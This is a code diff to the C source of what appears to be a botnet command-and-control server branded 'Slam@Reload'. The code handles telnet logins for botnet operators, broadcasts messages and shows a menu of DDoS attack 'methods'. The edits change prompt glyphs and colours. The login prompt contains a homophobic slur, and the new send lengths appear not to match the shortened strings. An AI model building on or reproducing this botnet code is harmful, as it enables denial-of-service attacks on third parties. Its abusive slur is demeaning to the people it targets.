@@ -149,7 +149,7 @@ void broadcast(char *msg, int us, char *sender)
                         send(i, ": ", 2, MSG_NOSIGNAL); 
                 }
                 send(i, msg, strlen(msg), MSG_NOSIGNAL);
-                if(sendMGM && managements[i].connected) send(i, "\r\e[38;2;89;255;0m[\e[38;2;0;229;255mSlam\e[38;2;89;255;0m@\e[38;2;0;229;255mReload\e[38;2;89;255;0m]\e[38;2;0;229;255m➤\e[38;2;89;255;0m ", 100, MSG_NOSIGNAL);
+                if(sendMGM && managements[i].connected) send(i, "\r\e[38;2;89;255;0m[\e[38;2;0;229;255mSlam\e[38;2;89;255;0m@\e[38;2;0;229;255mReload\e[38;2;89;255;0m]\e[38;2;0;229;255m~\e[38;2;89;255;0m ", 102, MSG_NOSIGNAL);
                 else send(i, "\n", 1, MSG_NOSIGNAL);
         }
         free(wot);
@@ -378,7 +378,7 @@ void *telnetWorker(void *sock) {
             fscanf(fp, "%s %s", accounts[j].id, accounts[j].password);
             ++j;
         }
-        sprintf(botnet, "\x1b[100mLogin Faggot\r\n");
+        sprintf(botnet, "Login Faggot\r\n");
         if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;  
 		sprintf(botnet, "Username: ");
         if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
@@ -426,7 +426,7 @@ void *telnetWorker(void *sock) {
         	if(send(thefd, banner4, strlen(banner4), MSG_NOSIGNAL) == -1) goto end;
 		if(send(thefd, banner9, strlen(banner9), MSG_NOSIGNAL) == -1) goto end;
 		while(1) {
-		if(send(thefd, "\r\e[38;2;89;255;0m[\e[38;2;0;229;255mSlam\e[38;2;89;255;0m@\e[38;2;0;229;255mReload\e[38;2;89;255;0m]\e[38;2;0;229;255m➤\e[38;2;89;255;0m ", 100, MSG_NOSIGNAL) == -1) goto end;
+		if(send(thefd, "\r\e[38;2;89;255;0m[\e[38;2;0;229;255mSlam\e[38;2;89;255;0m@\e[38;2;0;229;255mReload\e[38;2;89;255;0m]\e[38;2;0;229;255m~\e[38;2;89;255;0m ", 102, MSG_NOSIGNAL) == -1) goto end;
 		break;
 		}
         pthread_create(&title, NULL, &titleWriter, sock);
@@ -466,7 +466,7 @@ if (strncmp(buf, "METHODS", 7) == 0 || strncmp(buf, "methods", 7) == 0 || strncm
 				if(send(thefd, ddosline12,  strlen(ddosline12),	MSG_NOSIGNAL) == -1) goto end;
 				pthread_create(&title, NULL, &titleWriter, sock);
 				while(1) {
-				if(send(thefd, "\r\e[38;2;89;255;0m[\e[38;2;0;229;255mSlam\e[38;2;89;255;0m@\e[38;2;0;229;255mReload\e[38;2;89;255;0m]\e[38;2;0;229;255m➤\e[38;2;89;255;0m ", 100, MSG_NOSIGNAL) == -1) goto end;
+				if(send(thefd, "\r\e[38;2;89;255;0m[\e[38;2;0;229;255mSlam\e[38;2;89;255;0m@\e[38;2;0;229;255mReload\e[38;2;89;255;0m]\e[38;2;0;229;255m~\e[38;2;89;255;0m ", 102, MSG_NOSIGNAL) == -1) goto end;
 				break;
 				}
 				continue;
@@ -553,7 +553,7 @@ if (strncmp(buf, "METHODS", 7) == 0 || strncmp(buf, "methods", 7) == 0 || strncm
             goto end;
          }
                 trim(buf);
-                sprintf(botnet, "\r\e[38;2;89;255;0m[\e[38;2;0;229;255mSlam\e[38;2;89;255;0m@\e[38;2;0;229;255mReload\e[38;2;89;255;0m]\e[38;2;0;229;255m➤\e[38;2;89;255;0m ");
+                sprintf(botnet, "\r\e[38;2;89;255;0m[\e[38;2;0;229;255mSlam\e[38;2;89;255;0m@\e[38;2;0;229;255mReload\e[38;2;89;255;0m]\e[38;2;0;229;255m~\e[38;2;89;255;0m ");
                 if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
                 if(strlen(buf) == 0) continue;
                 printf("%s: \"%s\"\n",accounts[find_line].id, buf);
